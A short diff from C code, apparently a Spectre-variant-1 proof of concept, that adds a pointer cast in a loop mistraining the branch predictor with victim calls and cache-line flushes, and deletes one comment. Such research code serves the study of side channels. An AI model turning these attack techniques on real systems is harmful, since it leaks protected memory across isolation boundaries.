@@ -30,11 +30,10 @@ int* spv1() {
     //Misstrain branch predictor
     for(int i = 0; i < accessible_pages; i++) {
         victim_func(i, arr);
-        flush(&arr[i]);
+        flush((void*)&arr[i]);
         __sync_synchronize();
     }
 
-    //flush remnant data
     //flush_arr((void*)arr);
     //__sync_synchronize();
 
